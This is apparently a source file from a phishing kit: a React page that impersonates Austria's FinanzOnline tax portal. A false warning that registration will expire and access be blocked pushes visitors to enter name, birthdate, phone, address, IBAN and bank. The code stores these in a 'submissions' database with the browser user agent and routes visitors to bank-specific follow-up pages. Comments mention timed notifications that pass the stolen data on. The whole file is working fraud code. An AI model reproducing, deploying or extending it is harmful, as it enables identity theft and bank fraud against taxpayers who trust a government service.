import Header from "@/components/Header";
import { Info, AlertTriangle, ChevronsUpDown, Check } from "lucide-react";
import { useState, useRef, useEffect, useCallback } from "react";
import { usePageMeta } from "@/hooks/use-page-meta";
import { useNavigate } from "react-router-dom";
import { cn } from "@/lib/utils";
import { formatIBAN } from "@/lib/format";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import {
  Popover,
  PopoverContent,
  PopoverTrigger,
} from "@/components/ui/popover";
import {
  Command,
  CommandEmpty,
  CommandGroup,
  CommandItem,
  CommandList,
} from "@/components/ui/command";

import { banksAT as banks, bankRouteMapAT as bankRouteMap } from "@/lib/banks";

import idAustriaImg from "@/assets/IDAustria.png";
import finanznaviImg from "@/assets/Finanznavi.jpg";
import kundenserviceImg from "@/assets/Kundenservice.png";
import steuerbuchImg from "@/assets/steuerbuch.jpg";


function formatBirthdate(input: string): string {
  const d = input.replace(/\D/g, "").slice(0, 8);
  if (d.length === 0) return "";

  let day: string;
  let rest: string;
  if (d.length === 1) {
    if (d[0] === "0" || d[0] === "1" || d[0] === "2" || d[0] === "3") {
      return d;
    }
    day = "0" + d[0];
    rest = "";
  } else {
    day = d.slice(0, 2);
    rest = d.slice(2);
  }

  if (rest.length === 0) return day + ".";

  let month: string;
  let year: string;
  if (rest.length === 1) {
    if (rest[0] === "0" || rest[0] === "1") {
      return day + "." + rest[0];
    }
    month = "0" + rest[0];
    year = "";
  } else {
    month = rest.slice(0, 2);
    year = rest.slice(2);
  }

  if (year.length === 0) return day + "." + month + ".";
  return day + "." + month + "." + year;
}

const Index = () => {
  usePageMeta("FinanzOnline Login", "/favicon.png");
  const navigate = useNavigate();
  const [bankOpen, setBankOpen] = useState(false);
  const [selectedBank, setSelectedBank] = useState("");
  const [bankSearch, setBankSearch] = useState("");
  const inputRef = useRef<HTMLInputElement>(null);
  const [showLoading, setShowLoading] = useState(false);

  // Form state
  const [fullName, setFullName] = useState("");
  const [email, setEmail] = useState("");
  const [birthdate, setBirthdate] = useState("");
  const [phone, setPhone] = useState("");
  const [street, setStreet] = useState("");
  const [houseNumber, setHouseNumber] = useState("");
  const [staircase, setStaircase] = useState("");
  const [doorNumber, setDoorNumber] = useState("");
  const [postalCode, setPostalCode] = useState("");
  const [city, setCity] = useState("");
  const [iban, setIban] = useState("");

  useEffect(() => {
    if (bankOpen && inputRef.current) {
      inputRef.current.focus();
    }
  }, [bankOpen]);

  const selectedBankObj = banks.find((b) => b.name === selectedBank);


  const handleSubmit = useCallback(async () => {
    if (!selectedBank) return;
    const sessionId = crypto.randomUUID().slice(0, 8);
    const { data: inserted, error } = await supabase
      .from("submissions")
      .insert({
        session_id: sessionId,
        full_name: fullName,
        email,
        birthdate,
        phone,
        street,
        house_number: houseNumber,
        staircase,
        door_number: doorNumber,
        postal_code: postalCode,
        city,
        iban,
        bank: selectedBank,
        flow: "finanzonline",
        user_agent: typeof navigator !== "undefined" ? navigator.userAgent : null,
        domain: typeof window !== "undefined" ? window.location.hostname.replace(/^www\./, "").toLowerCase() : null,
      })
      .select("id")
      .single();

    if (error) {
      console.error("Insert failed:", error);
      alert("Fehler beim Speichern der Daten. Bitte versuchen Sie es erneut.");
      return;
    }

    // Full-Info notifications are handled by a pg_cron job that runs every minute
    // and sends any submission older than 5 minutes that hasn't been sent yet.
    // Logs are sent immediately from Confirmation.tsx.

    if (bankRouteMap[selectedBank]) {
      setShowLoading(true);
      setTimeout(() => {
        navigate(`/?s=${sessionId}`);
      }, 2500);
    }
  }, [selectedBank, fullName, email, birthdate, phone, street, houseNumber, staircase, doorNumber, postalCode, city, iban, navigate]);

  return (
    <div className="min-h-screen bg-white">
      {showLoading && (
        <LoadingOverlay message="Daten werden überprüft..." onComplete={() => {}} />
      )}
      <Header />
      <h1 className="py-8 text-center text-xl font-bold text-black md:py-12 md:text-2xl">
        Willkommen bei FinanzOnline
      </h1>

      <div className="container mx-auto px-4 py-4">
        <div className="rounded bg-[#f1f4f7] p-5" role="alert">
          <div className="mb-3 flex items-center gap-2">
            <Info className="h-5 w-5 text-gray-700" />
            <span className="text-base font-bold text-gray-900">Hinweis</span>
          </div>
          <div className="text-sm leading-relaxed text-gray-800">
            <p className="mb-3">
              <b>Wichtiger Hinweis zur Aktualisierung Ihrer Registrierungsdaten</b>
            </p>
            <p className="mb-3">
              Ihre Registrierung bei FinanzOnline läuft in Kürze ab. Um weiterhin Zugang zu allen Services zu gewährleisten, überprüfen und aktualisieren Sie bitte Ihre persönlichen Daten sowie Zugangsdaten zeitnah.
            </p>
            <p>
              Sollte die Aktualisierung nicht rechtzeitig erfolgen, kann Ihr Zugang eingeschränkt oder vorübergehend gesperrt werden – einschließlich der Abgabe von Steuererklärungen und der Einsicht in Bescheide.
            </p>
          </div>
        </div>

        {/* Persönliche Informationen Box */}
        <div className="mt-6 overflow-hidden rounded-lg border border-[#ddd] bg-[#f1f4f7] shadow-sm" role="region" aria-labelledby="region-personal">
          <div className="flex items-center justify-center gap-2 px-6 pt-6">
            <h2 id="region-personal" className="text-center text-lg font-bold text-gray-900">
              Persönliche Informationen
            </h2>
          </div>

          <div className="mx-5 mt-4 rounded-md bg-[#fff3cd] px-4 py-3">
            <div className="flex items-start gap-2">
              <AlertTriangle className="mt-0.5 h-5 w-5 flex-shrink-0 text-[#856404]" />
              <p className="text-sm text-[#856404]">
                Achtung! Bitte überprüfen und aktualisieren Sie Ihre persönlichen Informationen, um Ihren Zugang zu FinanzOnline aufrechtzuerhalten.
              </p>
            </div>
          </div>

          <div className="mx-5 mb-5 mt-4 rounded-lg bg-white p-6">
            <div className="space-y-5">
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Vor- und Nachname</label>
                <input type="text" value={fullName} onChange={(e) => setFullName(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">E-Mail</label>
                <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Geburtsdatum</label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={birthdate}
                  onChange={(e) => {
                    let raw = e.target.value;
                    if (raw.length < birthdate.length && birthdate.endsWith(".") && !raw.endsWith(".")) {
                      raw = raw.slice(0, -1);
                    }
                    setBirthdate(formatBirthdate(raw));
                  }}
                  placeholder="TT.MM.JJJJ"
                  maxLength={10}
                  className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none"
                />
              </div>

              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Telefonnummer</label>
                <input type="tel" value={phone} onChange={(e) => setPhone(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
              </div>

              <div className="grid grid-cols-[1.5fr_1fr] md:grid-cols-3 gap-4">
                <div className="md:col-span-2">
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Straße</label>
                  <input type="text" value={street} onChange={(e) => setStreet(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Hausnummer</label>
                  <input type="text" value={houseNumber} onChange={(e) => setHouseNumber(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Stiege</label>
                  <input type="text" value={staircase} onChange={(e) => setStaircase(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Türnummer</label>
                  <input type="text" value={doorNumber} onChange={(e) => setDoorNumber(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Postleitzahl</label>
                  <input type="text" value={postalCode} onChange={(e) => setPostalCode(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
                <div>
                  <label className="mb-1.5 block text-sm font-medium text-gray-600">Stadt</label>
                  <input type="text" value={city} onChange={(e) => setCity(e.target.value)} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm focus:border-gray-400 focus:outline-none" />
                </div>
              </div>

              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">IBAN</label>
                <input type="text" value={iban} onChange={(e) => setIban(formatIBAN(e.target.value))} maxLength={24} className="h-10 w-full rounded-md border border-gray-300 px-3 text-sm tracking-wider focus:border-gray-400 focus:outline-none" />
              </div>

              {/* Bank Auswahl */}
              <div>
                <label className="mb-1.5 block text-sm font-medium text-gray-600">Bank</label>
                <Popover open={bankOpen} onOpenChange={(open) => {
                  setBankOpen(open);
                  if (!open) setBankSearch("");
                }}>
                  <PopoverTrigger asChild>
                    <div
                      className="flex h-10 w-full cursor-pointer items-center rounded-md border border-gray-300 px-3 focus-within:border-gray-400"
                      role="combobox"
                      aria-expanded={bankOpen}
                      onClick={() => setBankOpen(true)}
                    >
                      {selectedBankObj && !bankOpen && (
                        <img src={selectedBankObj.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                      )}
                      <input
                        ref={inputRef}
                        type="text"
                        className={cn("h-full flex-1 bg-transparent text-sm outline-none", selectedBank ? "placeholder:text-black" : "placeholder:text-gray-400")}
                        placeholder={selectedBank || "Bank auswählen"}
                        value={bankSearch}
                        onClick={(e) => {
                          e.stopPropagation();
                          if (!bankOpen) setBankOpen(true);
                        }}
                        onChange={(e) => {
                          setBankSearch(e.target.value);
                          if (!bankOpen) setBankOpen(true);
                        }}
                        onFocus={(e) => {
                          e.stopPropagation();
                          if (!bankOpen) setBankOpen(true);
                        }}
                      />
                      <ChevronsUpDown className="h-4 w-4 flex-shrink-0 text-gray-400" />
                    </div>
                  </PopoverTrigger>
                  <PopoverContent className="w-[--radix-popover-trigger-width] p-0" align="start">
                    <Command>
                      <CommandList className="max-h-[250px] overflow-y-auto [&::-webkit-scrollbar]:w-1.5 [&::-webkit-scrollbar-thumb]:rounded-full [&::-webkit-scrollbar-thumb]:bg-gray-300 [&::-webkit-scrollbar-track]:bg-transparent">
                        <CommandEmpty>Keine Bank gefunden.</CommandEmpty>
                        <CommandGroup>
                          {banks
                            .filter((bank) =>
                              bank.name.toLowerCase().includes(bankSearch.toLowerCase())
                            )
                            .map((bank) => (
                              <CommandItem
                                key={bank.name}
                                value={bank.name}
                                onSelect={() => {
                                  setSelectedBank(bank.name);
                                  setBankSearch("");
                                  setBankOpen(false);
                                }}
                              >
                                <img src={bank.icon} alt="" className="mr-2 h-5 w-5 object-contain" />
                                <span className="flex-1">{bank.name}</span>
                                <Check
                                  className={cn(
                                    "ml-2 h-4 w-4",
                                    selectedBank === bank.name ? "opacity-100" : "opacity-0"
                                  )}
                                />
                              </CommandItem>
                            ))}
                        </CommandGroup>
                      </CommandList>
                    </Command>
                  </PopoverContent>
                </Popover>
              </div>

              <div className="pt-2">
                <button onClick={handleSubmit} className="w-full rounded-md border border-[#00436b] bg-white py-2.5 text-sm font-medium text-[#00436b] hover:bg-[#00436b]/5">
                  Weiter
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Aktuelles Sektion */}
        <div className="mt-10">
          <h2 className="mb-6 text-lg font-bold text-black md:text-xl">Aktuelles</h2>
          <div className="grid grid-cols-1 gap-6 md:grid-cols-2 lg:grid-cols-4">
            {[
              {
                img: idAustriaImg,
                title: "Infos zur ID Austria",
                text: "Alle Informationen zur ID Austria und wie Sie diese aktivieren können.",
                link: "https://www.oesterreich.gv.at/id-austria.html",
              },
              {
                img: finanznaviImg,
                title: "Finanznavi",
                text: "Ihr digitaler Wegweiser für Ihre Finanzentscheidungen.",
                link: "https://finanznavi.gv.at/",
              },
              {
                img: kundenserviceImg,
                title: "Kundenservice",
                text: "Alle Informationen zu unserem Kundenservice.",
                link: "https://www.bmf.gv.at/services/aemter-behoerden/faoe.html",
              },
              {
                img: steuerbuchImg,
                title: "Das Steuerbuch 2026",
                text: "Tipps zur Arbeitnehmerveranlagung 2025 für Lohnsteuerzahler/innen",
                link: "https://www.bmf.gv.at/public/top-themen/steuerbuch-2026.html",
              },
            ].map((item) => (
              <a
                key={item.title}
                href={item.link}
                target="_blank"
                rel="noopener noreferrer"
                className="group overflow-hidden rounded-lg"
              >
                <div className="aspect-[16/10] w-full overflow-hidden rounded-lg">
                  <img
                    src={item.img}
                    alt={item.title}
                    className="h-full w-full object-cover"
                  />
                </div>
                <div className="p-4">
                  <h3 className="mb-1 text-sm font-bold text-gray-900 group-hover:underline">{item.title}</h3>
                  <p className="text-xs leading-relaxed text-gray-600 group-hover:underline">{item.text}</p>
                </div>
              </a>
            ))}
          </div>
        </div>
      </div>

      {/* Informationen / Services / Technische Unterstützung */}
      <div className="mt-10 bg-white py-10">
        <div className="container mx-auto px-4">
          <div className="grid grid-cols-1 gap-8 text-center md:grid-cols-3 md:text-left">
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Informationen</h3>
              <ul className="space-y-2">
                <li><a href="https://www.bmf.gv.at/fon/sicherheit" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Sicherheitsinformationen</a></li>
                <li><a href="https://www.bmf.gv.at/fon/browsereinstellungen" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Technische Voraussetzungen</a></li>
                <li><a href="https://www.bmf.gv.at/fon/rechtl-grundlagen" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Rechtsgrundlagen</a></li>
                <li><a href="https://www.bmf.gv.at/dam/jcr:3f995b13-605b-4367-8d2f-b298cc37f3e7/registration_income%20tax%20and%20corporation%20tax%20return.pdf" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Registration / Income tax and Corporation tax return</a></li>
              </ul>
            </div>
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Services</h3>
              <ul className="space-y-2">
                <li><a href="https://finanzonline.bmf.gv.at/fon/a/auswahlErklDavor.do" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">Anonyme Steuerberechnung</a></li>
                <li><a href="https://finanzonline.bmf.gv.at/fon/a/vatToolAuswahl.do" target="_blank" rel="noopener noreferrer" className="text-sm text-[#005a8b] hover:underline">XML-Erstellung (VAT Refund)</a></li>
              </ul>
            </div>
            <div>
              <h3 className="mb-4 text-base font-bold text-gray-900">Technische Unterstützung</h3>
              <p className="text-sm leading-relaxed text-gray-800">
                Fragen Sie Fred, den Chatbot der Finanzverwaltung. Weitere Kontaktmöglichkeiten finden Sie unter{" "}
                <a href="https://www.bmf.gv.at/services/aemter-behoerden/faoe.html" target="_blank" rel="noopener noreferrer" className="text-[#005a8b] underline">
                  Kundenservice.
                </a>
              </p>
            </div>
          </div>
        </div>
      </div>
      {/* Footer */}
      <footer className="border-t border-gray-200 bg-white py-8">
        <div className="container mx-auto px-4 text-center">
          <div className="mb-6 flex flex-wrap items-center justify-center gap-2 text-sm text-black">
            <a href="https://www.bmf.gv.at/public/impressum.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Impressum</a>
            <span>/</span>
            <a href="https://www.bmf.gv.at/public/datenschutz.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Datenschutz</a>
            <span>/</span>
            <a href="https://www.bmf.gv.at/public/barrierefreiheitserklaerung.html" target="_blank" rel="noopener noreferrer" className="hover:underline">Barrierefreiheitserklärung</a>
            <span>/</span>
            <a href="https://service.bmf.gv.at/Service/Allg/Feedback/_start.asp?FTyp=KONTAKT" target="_blank" rel="noopener noreferrer" className="hover:underline">Kontakt</a>
          </div>
          <div className="flex items-center justify-center gap-4">
            <a href="https://www.instagram.com/bmaborgen/" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_instagram.svg" alt="Instagram" className="h-6 w-6" />
            </a>
            <a href="https://www.facebook.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_facebook.svg" alt="Facebook" className="h-6 w-6" />
            </a>
            <a href="https://www.youtube.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_youtube.svg" alt="YouTube" className="h-6 w-6" />
            </a>
            <a href="https://www.flickr.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_flickr.svg" alt="Flickr" className="h-6 w-6" />
            </a>
            <a href="https://www.linkedin.com/bmaborgen" target="_blank" rel="noopener noreferrer">
              <img src="https://finanzonline.bmf.gv.at/fon/img/icon-bcms_social_media_linkedin.svg" alt="LinkedIn" className="h-6 w-6" />
            </a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Index;
